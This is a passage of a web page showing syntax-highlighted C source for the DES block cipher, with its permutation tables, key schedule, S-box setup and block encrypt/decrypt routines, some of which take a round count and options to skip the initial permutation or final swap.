operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* initialize a perm array, p: 64-bit, either init or final */</span><span class="token keyword">void</span> <span class="token function">perminit</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> perm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> p<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>m<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token comment">/* each input nibble position */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* all possible input nibbles */</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token comment">/* each byte of the mask */</span>        perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>       <span class="token comment">/* clear permutation array */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token comment">/* each input nibble position */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token comment">/* each possible input nibble */</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">/* each output bit position  */</span>        l <span class="token operator">=</span> p<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token comment">/* where does this bit come from*/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> i<span class="token punctuation">)</span>     <span class="token comment">/* does it come from input posn?*/</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token comment">/* if not, bit k is 0 */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>j <span class="token operator">&amp;</span> nibblebit<span class="token punctuation">[</span>l <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token comment">/* any such bit in input? */</span>        m <span class="token operator">=</span> k <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">;</span>           <span class="token comment">/* which bit is this in the byte*/</span>        perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> bytebit<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/* 64 bits (will use only 56)   */</span><span class="token keyword">void</span> <span class="token function">kinit</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">/* initialize key schedule array*/</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>l<span class="token punctuation">;</span>  <span class="token keyword">int</span> m<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">56</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/* convert pc1 to bits of key   */</span>    l<span class="token operator">=</span>pc1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">/* integer bit location    */</span>    m <span class="token operator">=</span> l <span class="token operator">&amp;</span> <span class="token number">07</span><span class="token punctuation">;</span>                <span class="token comment">/* find bit      */</span>  <span class="token comment">/* find which key byte l is in and which bit of that byte, and store 1-bit   * result */</span>    pc1m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>l<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> bytebit<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token comment">/* for each key sched section */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token comment">/* and each byte of the kn */</span>      kn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment">/* clear it for accumulation */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/* key chunk for each iteration */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">56</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* rotate pc1 the right amount */</span>      <span class="token comment">/* rotate left and right halves independently */</span>      pcr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> pc1m<span class="token punctuation">[</span><span class="token punctuation">(</span>l<span class="token operator">=</span>j<span class="token operator">+</span>totrot<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>j<span class="token operator">&lt;</span><span class="token number">28</span><span class="token operator">?</span> <span class="token number">28</span> <span class="token operator">:</span> <span class="token number">56</span><span class="token punctuation">)</span> <span class="token operator">?</span> l<span class="token operator">:</span> l<span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">48</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* select bits individually  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pcr<span class="token punctuation">[</span>pc2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment">/* check bit that goes to kn[j] */</span>        l<span class="token operator">=</span> j <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">;</span>        kn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> bytebit<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* mask it in if it's there */</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/* 1 compression value for sinit*/</span><span class="token keyword">int</span> <span class="token function">getcomp</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span><span class="token keyword">int</span> v<span class="token punctuation">)</span>        <span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>            <span class="token comment">/* correspond to i and j in FIPS */</span>  i<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token operator">&amp;</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>v<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">/* first and last bits make row */</span>  j<span class="token operator">=</span><span class="token punctuation">(</span>v<span class="token operator">&amp;</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">1</span><span class="token punctuation">;</span>               <span class="token comment">/* middle 4 bits are column  */</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> si<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/* result is ith row, jth col */</span><span class="token punctuation">}</span><span class="token comment">/* initialize s1-s8 arrays    */</span><span class="token keyword">void</span> <span class="token function">sinit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* each 12-bit position */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">4096</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token comment">/* each possible 12-bit value */</span>      <span class="token comment">/* store 2 compressions per char*/</span>      s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">getcomp</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span>j<span class="token operator">&gt;&gt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">&amp;</span><span class="token function">getcomp</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token operator">&amp;</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* initialize 32-bit permutation */</span><span class="token keyword">void</span> <span class="token function">p32init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> perm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> p<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">register</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>m<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token comment">/* each input byte position */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token comment">/* all possible input bytes */</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token comment">/* each byte of the mask */</span>        perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">/* clear permutation array */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token comment">/* each input byte position */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token comment">/* each possible input byte */</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">&lt;</span><span class="token number">32</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">/* each output bit position */</span>        l<span class="token operator">=</span>p<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>              <span class="token comment">/* invert this bit (0-31) */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>l<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">!=</span>i<span class="token punctuation">)</span>         <span class="token comment">/* does it come from input posn?*/</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token comment">/* if not, bit k is 0 */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>j<span class="token operator">&amp;</span>bytebit<span class="token punctuation">[</span>l<span class="token operator">&amp;</span><span class="token number">0x7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token comment">/* any such bit in input? */</span>        m <span class="token operator">=</span> k <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">;</span>           <span class="token comment">/* which bit is it? */</span>        perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> bytebit<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/* initialize all des arrays  */</span><span class="token keyword">void</span> <span class="token function">desinit</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>  <span class="token function">perminit</span><span class="token punctuation">(</span>Iperm<span class="token punctuation">,</span>I<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">/* identical permutation */</span>  <span class="token function">perminit</span><span class="token punctuation">(</span>iperm<span class="token punctuation">,</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* initial permutation */</span>  <span class="token function">perminit</span><span class="token punctuation">(</span>fperm<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* final permutation */</span>  <span class="token function">kinit</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">/* key schedule */</span>  <span class="token function">sinit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* compression functions */</span>  <span class="token function">p32init</span><span class="token punctuation">(</span>p32<span class="token punctuation">,</span> p32i<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 32-bit permutation in f */</span>  <span class="token function">p32init</span><span class="token punctuation">(</span>rp32<span class="token punctuation">,</span> rp32i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* reverse 32-bit permutation in f */</span><span class="token punctuation">}</span><span class="token comment">/* encrypt 64-bit inblock  */</span><span class="token keyword">void</span> <span class="token function">endes</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>inblock<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>outblock<span class="token punctuation">,</span>           <span class="token keyword">int</span> round<span class="token punctuation">,</span> <span class="token keyword">int</span> have_ip<span class="token punctuation">,</span> <span class="token keyword">int</span> last_swap<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> iters<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">/* workspace for each iteration */</span>  <span class="token keyword">char</span> swap<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">/* place to interchange L and R */</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>          <span class="token comment">//用于循环计数</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span>        <span class="token comment">//指向交换数组swap的指针</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>have_ip <span class="token operator">==</span> HAVE_IP<span class="token punctuation">)</span>    <span class="token function">permute</span><span class="token punctuation">(</span>inblock<span class="token punctuation">,</span>iperm<span class="token punctuation">,</span>iters<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* apply initial permutation */</span>  <span class="token keyword">else</span>    <span class="token function">permute</span><span class="token punctuation">(</span>inblock<span class="token punctuation">,</span>Iperm<span class="token punctuation">,</span>iters<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* don't apply initial permutation */</span>  <span class="token comment">/* don't re-copy to save space  */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>round<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token comment">/* 16 churning operations  */</span>    <span class="token function">iter</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>iters<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>iters<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> swap<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>last_swap <span class="token operator">==</span> LAST_SWAP<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token comment">/* do last swap left and right */</span>    <span class="token comment">/* interchange left and right. */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> iters<span class="token punctuation">[</span>round<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> iters<span class="token punctuation">[</span>round<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                     <span class="token comment">/* don't do last swap left and right */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> iters<span class="token punctuation">[</span>round<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>have_ip <span class="token operator">==</span> HAVE_IP<span class="token punctuation">)</span>    <span class="token function">permute</span><span class="token punctuation">(</span>swap<span class="token punctuation">,</span>fperm<span class="token punctuation">,</span>outblock<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* apply final permutation  */</span>  <span class="token keyword">else</span>    <span class="token function">permute</span><span class="token punctuation">(</span>swap<span class="token punctuation">,</span>Iperm<span class="token punctuation">,</span>outblock<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* don't apply final permutation  */</span><span class="token punctuation">}</span><span class="token comment">/* decrypt 64-bit inblock  */</span><span class="token keyword">void</span> <span class="token function">dedes</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>inblock<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>outblock<span class="token punctuation">)</span>      <span class="token punctuation">{</span>  <span class="token keyword">char</span> iters<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* workspace for each iteration */</span>  <span class="token keyword">char</span> swap<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">/* place to interchange L and R */</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token operator">*</span>t<span class="token punctuation">;</span>  <span class="token function">permute</span><span class="token punctuation">(</span>inblock<span class="token punctuation">,</span>iperm<span class="token punctuation">,</span>iters<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* apply initial permutation  */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>             <span class="token comment">/* 16 churning operations  */</span>    <span class="token function">iter</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token operator">-</span>i<span class="token punctuation">,</span>iters<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>iters<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* reverse order from encrypting */</span>  s <span class="token operator">=</span> swap<span class="token punctuation">;</span> t <span class="token operator">=</span> <span class="token operator">&amp;</span>iters<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">/* interchange left    */</span>  <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span>  t <span class="token operator">=</span> <span class="token operator">&amp;</span>iters<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">/* and right      */</span>  <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>t<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token function">permute</span><span class="token punctuation">(</span>swap<span class="token punctuation">,</span>fperm<span class="token punctuation">,</span>outblock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* apply final permutation  */</span><span class="token punctuation">}</span><span class="token comment">/* End of DES algorithm */</span><span class="token keyword">void</span> <span class="token function">print_array</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>in<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>mode <span class="token operator">==</span> BIN_M<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">/* print array in binary */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span 